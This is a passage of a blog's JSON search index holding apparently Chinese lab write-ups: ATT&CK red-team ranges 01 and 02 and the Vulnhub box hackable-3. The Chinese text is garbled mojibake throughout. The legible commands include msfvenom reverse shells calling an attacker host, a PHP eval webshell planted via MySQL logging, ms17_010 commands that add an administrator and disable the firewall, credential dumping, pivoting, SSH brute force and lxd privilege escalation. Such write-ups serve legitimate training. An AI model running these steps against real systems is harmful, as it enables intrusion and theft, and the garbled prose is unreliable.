![](https://raw.githubusercontent.com/chencicici/images/main/202207221929827.png)\n\nmsfæ´¾ç”Ÿä¼šè¯\n\n```bash\nuse exploit/windows/local/payload_inject\nset payload windows/meterpreter/reverse_http\nset DisablePayloadHandler true   #é»˜è®¤æƒ…å†µä¸‹ï¼Œpayload_injectæ‰§è¡Œä¹‹åä¼šåœ¨æœ¬åœ°äº§ç”Ÿä¸€ä¸ªæ–°çš„handlerï¼Œç”±äºæˆ‘ä»¬å·²ç»æœ‰äº†ä¸€ä¸ªï¼Œæ‰€ä»¥ä¸éœ€è¦åœ¨äº§ç”Ÿä¸€ä¸ªï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è®¾ç½®ä¸ºtrue\nset lhost x.x.x.x               #cobaltstrikeç›‘å¬çš„ip\nset lport 6789                 #cobaltstrikeç›‘å¬çš„ç«¯å£ \nset session 1                   #è¿™é‡Œæ˜¯è·å¾—çš„sessionçš„id\nexploit\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207221935284.png)\n","tags":["cs"],"categories":["å·¥å…·ä½¿ç”¨"]},{"title":"ATT&CKçº¢é˜Ÿå®æˆ˜é¶åœº02","url":"/2022/07/18/ATT-CKçº¢é˜Ÿå®æˆ˜é¶åœº02/","content":"\n# æ‹“æ‰‘å›¾\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207191524897.png)\n\n\n\n# ç¯å¢ƒæ­å»º\n\n`WEBåˆå§‹å¯†ç é”™è¯¯ï¼Œéœ€è¦ä½¿ç”¨administratorç™»å½•ï¼Œå¯†ç ä¸ºç©º`\n\n| è™šæ‹Ÿæœº | ç½‘ç»œæ¨¡å¼                                                     | å¯†ç           |\n| ------ | ------------------------------------------------------------ | ------------- |\n| DC     | net1ä»…ä¸»æœºï¼š10.10.10.10                                      | 1qaz@WSX      |\n| PC     | net1æ¡¥æ¥å¤åˆ¶ç‰©ç†ç½‘ç»œï¼š192.168.31.189   net2ä»…ä¸»æœºï¼š10.10.10.201 | 1qaz@WSX      |\n| WEB    | net1æ¡¥æ¥å¤åˆ¶ç‰©ç†ç½‘ç»œï¼š192.168.31.18     net2ä»…ä¸»æœºï¼š10.10.10.80 | administra/ç©º |\n| Kali   | net1æ¡¥æ¥å¤åˆ¶ç‰©ç†ç½‘ç»œï¼š192.168.31.118                         |               |\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207191620529.png)\n\n\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207191620506.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207191621606.png)\n\n\n\nå¼€å¯weblogicæœåŠ¡åœ¨C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\binä¸‹ä»¥ç®¡ç†å‘˜è¿è¡Œ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207191626843.png)\n\n\n\n\n\n# å¤–ç½‘æ¸—é€\n\n## ä¿¡æ¯æ”¶é›†\n\n\n\nå‘ç°æ ¹æœ¬pingä¸é€š\n\n<img src=\"https://raw.githubusercontent.com/chencicici/images/main/202207191629862.png\" style=\"zoom:50%;\" />\n\né‡‡ç”¨åŠå¼€æ”¾å¼æ–¹å¼æ‰«æ\n\n<img src=\"https://raw.githubusercontent.com/chencicici/images/main/202207191642494.png\" style=\"zoom:50%;\" />\n\nå¼€æ”¾135å­˜åœ¨smbæœåŠ¡ï¼Œ445å¯èƒ½å­˜åœ¨ms17_010,3389æ˜¯è¿œç¨‹å¯èƒ½å­˜åœ¨å¼±å£ä»¤ï¼Œ7001weblogicå¯èƒ½å­˜åœ¨å‘½ä»¤æ‰§è¡Œ\n\n## webæ‰“ç‚¹\n\nä½¿ç”¨å·¥å…·æ£€æµ‹å‡ºå­˜åœ¨CVE-2020-2551\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207191648372.png)\n\næœ¬æ¥æƒ³ä½¿ç”¨å·¥å…·ç›´æ¥ä¸Šä¼ webshellï¼Œä½†æ˜¯ä¸Šä¼ æˆåŠŸåèšå‰‘ä¸€ç›´è¿æ¥ä¸ä¸Šï¼Œæ€€ç–‘æ˜¯è¢«æ€è½¯é˜»æ­¢äº†\n\né‡æ–°ä½¿ç”¨msfç”Ÿæˆpayloadä¸Šä¼ jspshell\n\nä¸Šä¼ è·¯å¾„`C:\\Oracle\\Middleware\\wlserver_10.3\\server\\lib\\consoleapp\\webapp\\framework\\skins\\wlsconsole\\images\\1.jsp`\n\nè®¿é—®è·¯å¾„`http://192.168.31.18:7001/console/framework/skins/wlsconsole/images/1.jsp`\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207191803812.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207191801883.png)\n\nkaliç›‘å¬è¿”å›ä¸€ä¸ªä¼šè¯ï¼Œè‡ªå¸¦ææƒå¤±è´¥ï¼Œåº”è¯¥æ˜¯è¢«æ€è½¯æ‹¦æˆªäº†\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207191804270.png)\n\nå‘ç°å­˜åœ¨360ï¼Œå¾ˆå¤šæ“ä½œè¢«æ‹¦æˆª\n\n![image-20220719181132987](/Users/chenci/Library/Application Support/typora-user-images/image-20220719181132987.png)\n\n`ps`ç»§ç»­æŸ¥çœ‹è¿›ç¨‹,å‘ç°ç³»ç»Ÿè¿›ç¨‹services.exe\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207191824277.png)\n\nå°†æˆ‘ä»¬msfåé—¨çš„è¿›ç¨‹è¿ç§»è‡³è¿™ä¸ªè¿›ç¨‹ï¼Œæ‹¿åˆ°systemæƒé™\n\n<img src=\"https://raw.githubusercontent.com/chencicici/images/main/202207191825675.png\" style=\"zoom:50%;\" />\n\nå…³é—­360\n\n<img src=\"https://raw.githubusercontent.com/chencicici/images/main/202207191836792.png\" style=\"zoom:50%;\" />\n\n\n\n# å†…ç½‘æ¸—é€\n\n## ä¿¡æ¯æ”¶é›†\n\n\n\n```bash\næŸ¥çœ‹åŸŸå net config workstation\næŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ  net view /domain\næŸ¥çœ‹åŸŸå†…ä¸»æœº  net view\næŸ¥è¯¢åŸŸå†…ç”¨æˆ·   net user /domain #è¯¥å‘½ä»¤åœ¨æœ¬ç¯å¢ƒä¸­éœ€è¦åœ¨systemæƒé™ä¸‹æ‰§è¡Œ\næŸ¥çœ‹åŸŸç®¡ç†å‘˜   net group \"domain admins\" /domain  \næŸ¥çœ‹åŸŸæ§    net group \"domain controllers\" /domain  \nå…³é—­é˜²ç«å¢™\t\tnetsh advfirewall set allprofiles state off\n```\n\n\n\nåˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ\n\n<img src=\"https://raw.githubusercontent.com/chencicici/images/main/202207191833680.png\" style=\"zoom:50%;\" />\n\nå‘ç°è¿˜æœ‰ä¸€ä¸ªç½‘æ®µï¼ŒåŸŸæ§ä¸€èˆ¬æ˜¯æœ¬æœºçš„dnsåœ°å€\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207191841223.png)\n\n\n\nä¹Ÿå¯ä»¥é€šè¿‡msfæ¥å®šä½\n\n`run post/windows/gather/enum_domain æŸ¥çœ‹åŸŸæ§`\n\n`run post/windows/gather/enum_ad_computersæŸ¥çœ‹åŸŸå†…æˆå‘˜`\n\n\n\n<img src=\"https://raw.githubusercontent.com/chencicici/images/main/202207191846946.png\" style=\"zoom:50%;\" />\n\n\n\n## æ¨ªå‘æ‰“ç‚¹\n\n`run post/multi/manage/autoroute æ–°å»ºè·¯ç”±`\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207191856195.png)\n\n`run autoroute -p æŸ¥çœ‹è·¯ç”±`\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207191858908.png)\n\nbackgroundæŒ‚èµ·ä¼šè¯ï¼Œæ·»åŠ routeåªèƒ½ä½¿ç”¨msfè‡ªå¸¦çš„å·¥å…·ï¼Œè¦ä½¿ç”¨åˆ«çš„ï¼Œè¿˜éœ€è¦åå‘ä»£ç†\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207191905070.png)\n\n\n\n`vim /etc/proxychains4.conf æ·»åŠ ä»£ç†`\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207191908336.png)\n\næµ‹è¯•ä»£ç†æ˜¯å¦å¯ç”¨\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207192015948.png)\n\n\n\n`post/windows/gather/arp_scanner æ‰«æå­˜æ´»ä¸»æœº`\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207192017651.png)\n\nä½¿ç”¨kiwiæŠ“å–å¯†ç \n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207191920816.png)\n\nç”Ÿæˆpayloadä¸Šçº¿csï¼Œä½¿ç”¨svcæå‡è‡³systemæƒé™\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207201912329.png)\n\n\n\n\n\n## PsExecä¼ é€’\n\nä½¿ç”¨ç°åœ¨è¿™å°ä¸»æœºä¸­è½¬ä¸€ä¸ªç›‘å¬å™¨ï¼Œåˆ©ç”¨psexecæ¨ªå‘ç§»åŠ¨è‡³DCï¼ŒDCæˆåŠŸä¸Šçº¿\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207201917397.png)\n\n\n\nè¿˜å‰©ä¸€å°pcä¹Ÿæ˜¯ä¸€æ ·çš„æ‰“æ³•\n\n","tags":["ATT&CK","å†…ç½‘æ¸—é€"],"categories":["æ‰“é¶"]},{"title":"ATT&CKçº¢é˜Ÿå®æˆ˜é¶åœº01","url":"/2022/07/17/ATT&CKçº¢é˜Ÿå®æˆ˜é¶åœº01/","content":"# æ‹“æ‰‘å›¾\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171447834.png)\n\n# ç¯å¢ƒæ­å»º\nä¸‰å°æœºå™¨ï¼Œè§£å‹ä½¿ç”¨vmæ‰“å¼€ï¼Œé»˜è®¤å¯†ç hongrisec@2019\n\n# ç½‘ç»œé…ç½®\nwin7å¢åŠ ä¸€å—ç½‘å¡,è®¾ç½®ä¸ºæ¡¥æ¥æ¨¡å¼,ç”¨æ¥è¿é€šæ”»å‡»æœº.ä»…ä¸»æœºç”¨æ¥è¿é€šå†…ç½‘çš„ä¸¤å°é¶æœº\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171452480.png)\n\n\n## é¶æœº\nwin7 net1æ¡¥æ¥ å¤–ç½‘192.168.31.183 net2ä»…ä¸»æœº å†…ç½‘:192.168.52.143\nwin2003 net1ä»…ä¸»æœº å†…ç½‘:192.168.52.141\nwin2003 net1ä»…ä¸»æœº å†…ç½‘:192.168.52.138\n\n## æ”»å‡»æœº\nkali net1æ¡¥æ¥ å¤–ç½‘:192.168.31.118\n\n## å¼€å¯webç¯å¢ƒ\nåœ¨win7å¯åŠ¨phpstudy\n\n\n# å¤–ç½‘çªç ´\n## ä¿¡æ¯æ”¶é›†\nkaliæ‰«ä¸€ä¸‹ç½‘æ®µ,ç¡®è®¤é¶æœºip\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171513229.png)\n\n\nè®¿é—®æ˜¯ä¸€ä¸ªphpæ¢é’ˆ\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171511761.png)\n\næ¥ç€æ‰«ä¸€ä¸‹ç›®å½•,å­˜åœ¨phpmyadmin\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171517733.png)\n\nå¼±å¯†ç ç™»å½•æˆåŠŸ root root\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171519266.png)\n\n\n## getshell\nå°è¯•é€šè¿‡æ–‡ä»¶å†™é©¬,ä½†æ˜¯--secure0file-privè¢«å†™æ­»\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171525433.png)\n\nç»§ç»­å°è¯•æ—¥å¿—å†™é©¬\n```mysql\nshow variables like '%general%';\n```\n\nå‘ç°æ—¥å¿—åŠŸèƒ½å…³é—­,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡mysqlå‘½ä»¤å¼€å¯,å¹¶ä¿å­˜ä¿®æ”¹è·¯å¾„å­˜åˆ°æˆ‘ä»¬æŒ‡å®šçš„ç›®å½•\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171529236.png)\n\nå¼€å¯æ—¥å¿—å¹¶ä¿®æ”¹ä¿å­˜è·¯å¾„\n```mysql\nset global general_log=on;\nset global general_log_file='C:/phpStudy/WWW/shell.php'\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171533073.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171534976.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171534585.png)\n\næŸ¥è¯¢ä¸€å¥è¯æœ¨é©¬,åˆ©ç”¨æ—¥å¿—å†™å…¥shell.phpä¸­\n\n```mysql\nSELECT '<?php eval($_POST[\"cmd\"]);?>'\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171536904.png)\n\n\nèšå‰‘è¿æ¥\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171537195.png)\n\n## å†…ç½‘ä¿¡æ¯æ”¶é›†\n`whoami`æŸ¥çœ‹å½“å‰ç”¨æˆ·ä¸ºç®¡ç†å‘˜\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171540344.png)\n\n\n`ipconfig` å‘ç°è¿˜å­˜åœ¨ä¸€ä¸ªç½‘æ®µ\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171541043.png)\n\n`net config Workstation` æŸ¥çœ‹å½“å‰è®¡ç®—æœºåç§°,ç”¨æˆ·åç­‰è¯¦ç»†ä¿¡æ¯\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171543492.png)\n\n`net localgroup administrators` æŸ¥çœ‹å…¶ä»–ç®¡ç†å‘˜\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171543392.png)\n\n`systeminfo` æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯,å‘ç°æ‰“äº†4ä¸ªè¡¥ä¸,å½“å‰åŸŸä¸ºgod.org,åŸŸæœåŠ¡å™¨åOWA\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171545007.png)\n\n## åå¼¹shell\nç”±äºwin7å¯åŠ¨äº†å®‰å…¨æ¨¡å¼,æ‰€ä»¥æ— æ³•ç›´æ¥åå¼¹shell,ç”¨msfç”Ÿæˆä¸€ä¸ªæœ¨é©¬\n```bash\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.118 LPORT=4444 -f exe -o msf.exe\n```\n```bash\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.31.118\nset LPORT 4444\nrun\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171558828.png)\n\næå‡ä¸ºsystemæƒé™\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171601565.png)\n\n\npsï¼šmimikatzæ¨¡å—å·²ç»åˆå¹¶ä¸ºkiwiæ¨¡å—\n```\ncreds_allï¼šåˆ—ä¸¾æ‰€æœ‰å‡­æ®\ncreds_kerberosï¼šåˆ—ä¸¾æ‰€æœ‰kerberoså‡­æ®\ncreds_msvï¼šåˆ—ä¸¾æ‰€æœ‰msvå‡­æ®\ncreds_sspï¼šåˆ—ä¸¾æ‰€æœ‰sspå‡­æ®\ncreds_tspkgï¼šåˆ—ä¸¾æ‰€æœ‰tspkgå‡­æ®\ncreds_wdigestï¼šåˆ—ä¸¾æ‰€æœ‰wdigestå‡­æ®\ndcsyncï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·ä¿¡æ¯\ndcsync_ntlmï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·NTLMæ•£åˆ—ã€SIDå’ŒRID\ngolden_ticket_createï¼šåˆ›å»ºé»„é‡‘ç¥¨æ®\nkerberos_ticket_listï¼šåˆ—ä¸¾kerberosç¥¨æ®\nkerberos_ticket_purgeï¼šæ¸…é™¤kerberosç¥¨æ®\nkerberos_ticket_useï¼šä½¿ç”¨kerberosç¥¨æ®\nkiwi_cmdï¼šæ‰§è¡Œmimikatzçš„å‘½ä»¤ï¼Œåé¢æ¥mimikatz.exeçš„å‘½ä»¤\nlsa_dump_samï¼šdumpå‡ºlsaçš„SAM\nlsa_dump_secretsï¼šdumpå‡ºlsaçš„å¯†æ–‡\npassword_changeï¼šä¿®æ”¹å¯†ç \nwifi_listï¼šåˆ—å‡ºå½“å‰ç”¨æˆ·çš„wifié…ç½®æ–‡ä»¶\nwifi_list_sharedï¼šåˆ—å‡ºå…±äº«wifié…ç½®æ–‡ä»¶/ç¼–ç \n\n```\n\næŠ“å–å¯†ç \n![](https://raw.githubusercontent.com/chencicici/images/main/202207171613114.png)\n\n# è¿›å…¥å†…ç½‘\n## ä¿¡æ¯æ”¶é›†\næŸ¥çœ‹å®‰è£…çš„è½¯ä»¶\n```bash\nrun post/windows/gather/enum_applications\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171616956.png)\n\n\næŸ¥çœ‹è·¯ç”±,å‘ç°è¿˜å­˜åœ¨å¦ä¸€ä¸ªç½‘æ®µ192.168.52.0/24\n```bash\narp -a\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171618532.png)\n\n\næ·»åŠ è·¯ç”±\n```bash\nrun autoroute -s 192.168.52.0/24æ·»åŠ å½•è·¯ç”±ï¼›\nrun autoroute -pæŸ¥çœ‹è·¯ç”±ï¼›\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171621412.png)\n\nè®¾ç½®ä»£ç†è®¿é—®å†…ç½‘\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171652380.png)\n```bash\nuse auxiliary/server/socks_proxy\nset srvhost 192.168.2.129\nset srvport 1080\nrun\n```\n\né…ç½®ä»£ç†\n```bash\nvim /etc/proxychains4.conf\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171653857.png)\n\næµ‹è¯•\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171719877.png)\n\næ¢æµ‹å†…ç½‘å­˜æ´»ä¸»æœº\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171706996.png)\n\nç”¨nmapæ‰«æå´æ‰«ä¸å‡ºæ¥\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171720554.png)\n\nåˆšåˆšæ‹¿ä¸‹çš„win7æ˜¯å­˜åœ¨nmapçš„,ç”¨å®ƒæ‰«æ.è¿›å…¥kaliåˆšåˆšåå¼¹çš„ä¼šè¯,èšå‰‘ä¸æ˜¯äº¤äº’å¼shellçœ‹ä¸åˆ°è¿”å›\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171727686.png)\n\n# å†…ç½‘æ‰“ç‚¹\nä¸¤å°ä¸»æœºéƒ½å­˜åœ¨445 å’Œ 135 ç«¯å£,è¯´æ˜å­˜åœ¨smbæœåŠ¡\nå°è¯•ms17_010,å‘ç°æ‰“ä¸äº†\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171731292.png)\n\nå†æ¬¡å°è¯•ms17_010_command,æˆåŠŸæ‰§è¡Œå‘½ä»¤\n![](https://raw.githubusercontent.com/chencicici/images/main/202207171733335.png)\n\n\n```bash\nset command net user hack 8888! /addæ·»åŠ ç”¨æˆ·ï¼›\nset command net localgroup administrators hack /addæ·»åŠ ç®¡ç†å‘˜æƒé™ï¼›\nset command 'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'æ‰§è¡Œå‘½ä»¤å¼€å¯3389ç«¯å£ï¼Œè¿™é‡Œè¦ä¹ˆç”¨å•å¼•å·æŠŠå‘½ä»¤å¼•ä½ï¼Œè¦ä¹ˆç”¨åæ–œæ å¯¹åæ–œæ å’Œå¼•å·è¿›è¡Œè½¬ä¹‰ï¼Œå¦åˆ™ä¼šå‡ºé”™ï¼›\nset command netsh firewall set opmode mode=disable /å…³é—­é˜²ç«å¢™\n```\n\nwin2003ä¹Ÿæ˜¯ä¸€æ ·çš„æ‰“æ³•ä¸å†èµ˜è¿°\n\n","tags":["ATT&CK","å†…ç½‘æ¸—é€"],"categories":["æ‰“é¶"]},{"title":"hackable-3æ‰“é¶","url":"/2022/06/27/hackable-3æ‰“é¶/","content":"# ç¯å¢ƒ\nvulnhubé¡¹ç›® https://www.vulnhub.com/entry/hackable-iii,720/\né¶æœº:172.16.17.156\næ”»å‡»æœºkali:172.16.17.140\n\n# ä¿¡æ¯æ”¶é›†\nnmapæ‰«æé¶æœº,22ç«¯å£filtered,80æ­£å¸¸å¼€å‘,apache\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272036738.png)\n\nè®¿é—®é¦–é¡µçœ‹çœ‹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272042009.png)\n\næ²¡æœ‰åŠŸèƒ½ç‚¹,æ‰«ä¸‹ç›®å½•\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272044678.png)\n\næŒ¨ä¸ªè®¿é—®,æœ‰ä¸¤ä¸ªtxtæ–‡ä»¶\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272053867.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272054740.png)\nä¸€ä¸ªå­—å…¸\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272055221.png)\n\nä¸€ä¸²å¯†æ–‡,base64è§£å‡ºä¸º10000,æš‚æ—¶ä¸çŸ¥é“ä»€ä¹ˆæ„æ€,ç»§ç»­å¾€ä¸‹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272057190.png)\n\nåœ¨ç½‘é¡µæºç é‡Œçœ‹åˆ°äº†æ³¨é‡Š,å¾—åˆ°æç¤º,è¿˜æœ‰ä¸€ä¸ªç™»å½•å£\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272048590.png)\n\n```\n <!-- \"Please, jubiscleudo, don't forget to activate the port knocking when exiting your section, \n and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com\" -->\n \n <!-- â€œjubiscleudoï¼Œè¯·ä¸è¦å¿˜è®°åœ¨é€€å‡ºéƒ¨é—¨æ—¶æ¿€æ´»ç«¯å£æ•²é—¨ï¼Œå¹¶å‘Šè¯‰è€æ¿ä¸è¦å¿˜è®°æ‰¹å‡†.jpgæ–‡ä»¶-dev_suport@hackable3.com\" -->\n```\nå¾—åˆ°ä¸€ä¸ªç”¨æˆ·åå’Œä¸€ä¸ªé‚®ç®±,ç»“åˆä¸Šé¢çš„ç«¯å£æ‰«æ,åº”è¯¥æ˜¯æç¤ºéœ€è¦ç¢°æ’æ‰“å¼€22ç«¯å£\n\nè®¿é—®ç™»å½•å£\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272100696.png)\n\n\nå°è¯•åˆ©ç”¨ä¸Šé¢çš„å­—å…¸çˆ†ç ´,æ— æœ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272105700.png)\n\nåœ¨ç™»å½•é¡µçš„æºç é‡Œç¿»åˆ°ä¸€ä¸ªåœ°å€\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272110189.png)\n\nè¿›ä¸€æ­¥æ‰«æç›®å½•,.phpç»“å°¾çš„æ–‡ä»¶\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272111295.png)\n\næŒ¨ä¸ªè®¿é—®,çˆ†å‡ºäº†æºç å’Œæ•°æ®åº“å¯†ç ,ä½†æ˜¯æ•°æ®åº“ç«¯å£å¹¶ä¸å¯¹å¤–å¼€æ”¾\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272112979.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272113138.png)\n\nlogin.phpä¸­æåˆ°ä¸€ä¸ª3.jpg,ç›´æ¥è®¿é—®çœ‹çœ‹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272125744.png)\n\næ²¡æœ‰ä»»ä½•æç¤ºå’Œåˆ©ç”¨çš„åœ°æ–¹,æƒ³åˆ°éšå†™,æŠŠå›¾ç‰‡ä¸‹è½½ä¸‹æ¥ è¿›è¡Œçˆ†ç ´\n```bash\nwget http://172.16.17.156/3.jpg ./\nsteghide --extract -sf 3.jpg\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272134681.png)\n\nå¾—åˆ°æç¤º,porta:65535,å‰é¢å¾—åˆ°ä¸€ä¸ª10000,åº”è¯¥æ˜¯knockä½¿ç”¨ç¢°æ’sshç«¯å£,ä½†æ˜¯è¿˜å·®ä¸€ä¸ª,ç»§ç»­ç¿»å‰é¢çˆ†ç ´å‡ºçš„ç›®å½•\n\nç¿»åˆ°ä¸€ä¸ª2.txt\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272140728.png)\n\nç†Ÿæ‚‰çš„ctfåŠ å¯†æ–¹å¼\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272140818.png)\n\nè§£å¯† http://www.hiencode.com/brain.html\n![](https://raw.githubusercontent.com/chencicici/images/main/202206272142726.png)\n\nå¾—åˆ°ä¸‰ä¸ªç«¯å£å· 65535 10000 4444\n\n# Exploit\n## ç¢°æ’sshæ‰“å¼€ç«¯å£\n```bash\nknock 172.16.17.156 -v 10000 4444 65535\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206280958059.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206280959656.png)\n\n## çˆ†ç ´ssh\nä½¿ç”¨ä¸Šé¢æ‹¿åˆ°çš„ç”¨æˆ·åå’Œå­—å…¸,çˆ†ç ´ssh\n```bash\nhydra -l jubiscleudo -P wordlist.txt 172.16.17.156 ssh \n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206281006417.png)\n\n\nç™»å½•è´¦å·,æ‰¾åˆ°ç¬¬ä¸€ä¸ªflag\n![](https://raw.githubusercontent.com/chencicici/images/main/202206281012148.png)\n\n\n## ææƒ\næ²¡æœ‰sudoæƒé™çš„æ–‡ä»¶,åœ¨ç½‘ç«™ç›®å½•ä¸‹ç¿»åˆ°ä¸€ä¸ªéšè—æ–‡ä»¶,æç¤ºæˆ‘ä»¬mysql rootç”¨æˆ·æ²¡æœ‰å¯†ç \n![](https://raw.githubusercontent.com/chencicici/images/main/202206281015482.png)\n\nå°è¯•ç™»å½•mysqlå‘ç°æ ¹æœ¬æ²¡æœ‰è¿™ä¸ªæœåŠ¡\n![](https://raw.githubusercontent.com/chencicici/images/main/202206281017369.png)\n\nå›åˆ°ä¸Šé¢çš„éšè—æ–‡ä»¶,å‘ç°ç»™å‡ºä¸€ä¸ªè´¦å·å¯†ç ,åœ¨å®¶ç›®å½•ç¿»çš„æ—¶å€™,æ°å¥½æœ‰ä¸€ä¸ªhackable_3ç”¨æˆ·çš„æ–‡ä»¶å¤¹\n```bash\ndefine('DB_USERNAME', 'hackable_3');\ndefine('DB_PASSWORD', 'TrOLLED_3');\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206281020151.png)\n\nç™»å½•æˆåŠŸ,ä½†æ˜¯æ²¡æœ‰ä»»ä½•å¯åˆ©ç”¨çš„åœ°æ–¹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206281023340.png)\n\næŸ¥é˜…å…¶ä»–å¸ˆå‚…çš„æ–‡ç« ,å‘ç°åœ¨lxdç»„ä¸­,lxdå’Œdockerä¸€æ ·,ä¸€ç§å®¹å™¨\n![](https://raw.githubusercontent.com/chencicici/images/main/202206281028117.png)\n\nåˆ©ç”¨lxdå®¹å™¨ææƒ,æ€è·¯æ˜¯å°†å®¹å™¨çš„ç›®å½•æ˜ å°„åˆ°rootç›®å½•ä¸‹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206281039098.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206281037956.png)\n\n\n[ææƒæ–¹æ³•](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation) ä½¿ç”¨ç¬¬äºŒç§\n```bash\n# build a simple alpine image\ngit clone https://github.com/saghul/lxd-alpine-builder\ncd lxd-alpine-builder\nsed -i 's,yaml_path=\"latest-stable/releases/$apk_arch/latest-releases.yaml\",yaml_path=\"v3.8/releases/$apk_arch/latest-releases.yaml\",' build-alpine\nsudo ./build-alpine -a i686\n\n# import the image\nlxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.\n\n# before running the image, start and configure the lxd storage pool as default \nlxd init\n\n# run the image\nlxc init myimage mycontainer -c security.privileged=true\n\n# mount the /root into the image\nlxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true\n\n# interact with the container\nlxc start mycontainer\nlxc exec mycontainer /bin/sh\n```\n\nåœ¨/mnt/root/rootä¸‹æ‹¿åˆ°flag\n![](https://raw.githubusercontent.com/chencicici/images/main/202206281041068.png)\n","tags":["vulnhub","ftp"],"categories":["æ‰“é¶"]},{"title":"hackable:2æ‰“é¶","url":"/2022/06/27/hackable-2æ‰“é¶/","content":"# ç¯å¢ƒ\nvulnhubé¡¹ç›® https://www.vulnhub.com/entry/darkhole-2,740/\né¶æœº:172.16.17.155\næ”»å‡»æœºkali:172.16.17.140\n\n\n# ä¿¡æ¯æ”¶é›†\nå¯¹é¶æœºè¿›è¡Œç«¯å£æ‰«æ,å¼€æ”¾äº†21,22,80,å­˜åœ¨Anonymousç”¨æˆ·\n![](https://raw.githubusercontent.com/chencicici/images/main/202206271926183.png)\n\nç½‘ç«™å°±ä¸€ä¸ªapacheé¦–é¡µ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206271935104.png)\n\n\n# Exploit\n\n## ftp\nå›åˆ°ftpä½¿ç”¨Anonymousç”¨æˆ·ç™»å½•,å¯†ç 